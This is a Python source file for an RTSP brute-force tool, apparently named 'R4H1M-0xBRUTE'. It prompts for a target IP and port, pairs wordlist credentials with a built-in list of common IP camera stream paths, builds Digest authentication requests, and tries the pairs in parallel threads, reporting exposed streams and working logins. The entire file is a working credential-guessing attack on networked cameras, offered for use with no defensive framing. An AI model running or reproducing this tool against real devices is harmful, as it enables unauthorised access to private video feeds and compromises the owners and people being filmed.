import socket
import hashlib
import threading
import sys
import pyfiglet

ascii_banner = pyfiglet.figlet_format("R4H1M-0xBRUTE")
print(f"\033[1;36m{ascii_banner}\033[0m")  



def ask_target():
    global TARGET_IP, PORT
    print("=== RTSP Bruteforce Tool ===")
    TARGET_IP = input("Enter target IP address: ").strip()
    if not TARGET_IP:
        print("Invalid IP. Exiting.")
        sys.exit(1)

    try:
        PORT = int(input("Enter port (default 554): ") or 554)
    except:
        print("Invalid port. Exiting.")
        sys.exit(1)

ask_target()

WORDLIST = "Lib/wordlist.txt"
PATHLIST = "Lib/path.txt"

print_lock = threading.Lock()
stop_flag = threading.Event()

COMMON_PATHS = [
    "/", "/live.sdp", "/h264.sdp", "/mpeg4", "/ch0_0.h264",
    "/video", "/video.sdp", "/video1", "/stream1", "/stream2",
    "/stream.sdp", "/live", "/live/ch00_0", "/h264", "/h264_ulaw.sdp",
    "/h264_pcm.sdp", "/cam1", "/camera", "/cam", "/media/video1",
    "/media/video2", "/av0_0", "/av0_1", "/ch1", "/ch0",
    "/snapshot", "/live0", "/live1", "/Streaming/Channels/1",
    "/Streaming/Channels/101", "/0", "/1"
]


def load_list(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        return []


def parse_combo(line):
    if ":" not in line:
        return None, None
    return tuple(line.split(":", 1))


def make_digest_header(username, password, method, uri, realm, nonce, qop="auth"):
    nc = "00000001"
    cnonce = "abcdef1234567890"
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()

    return (
        f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
        f'uri="{uri}", algorithm=MD5, response="{response}", qop={qop}, '
        f'nc={nc}, cnonce="{cnonce}"'
    )


def try_rtsp(username, password, path):
    if stop_flag.is_set():
        return

    uri = f"rtsp://{TARGET_IP}:{PORT}{path}"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, PORT))
    except:
        return

    try:
        req = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        s.send(req.encode())
        resp = s.recv(1024).decode()
    except:
        s.close()
        return

    if "401 Unauthorized" not in resp:
        with print_lock:
            print(f"[OPEN] {uri}")
        s.close()
        return

    try:
        realm = resp.split('realm="')[1].split('"')[0]
        nonce = resp.split('nonce="')[1].split('"')[0]
    except:
        s.close()
        return

    auth_header = make_digest_header(username, password, "DESCRIBE", uri, realm, nonce)
    req2 = (
        f"DESCRIBE {uri} RTSP/1.0\r\n"
        f"CSeq: 2\r\n"
        f"Authorization: {auth_header}\r\n\r\n"
    )

    try:
        s.send(req2.encode())
        resp2 = s.recv(1024).decode()
    except:
        s.close()
        return

    s.close()

    if stop_flag.is_set():
        return

    if "200 OK" in resp2:
        with print_lock:
            print(f"\n[SUCCESS] Valid → {username}:{password} @ {uri}\n")
        stop_flag.set()
        sys.exit(0)
    else:
        with print_lock:
            print(f"[FAIL] {username}:{password} @ {uri}")


def main():
    combos = load_list(WORDLIST)
    user_paths = load_list(PATHLIST)

    all_paths = list(set(user_paths + COMMON_PATHS))

    print(f"\n[+] Target: {TARGET_IP}:{PORT}")
    print(f"[+] Loaded {len(combos)} credentials")
    print(f"[+] Loaded {len(all_paths)} paths\n")

    for combo in combos:
        if stop_flag.is_set():
            break

        username, password = parse_combo(combo)
        if not username:
            continue

        for path in all_paths:
            if stop_flag.is_set():
                break

            t = threading.Thread(target=try_rtsp, args=(username, password, path))
            t.start()


if __name__ == "__main__":
    main()
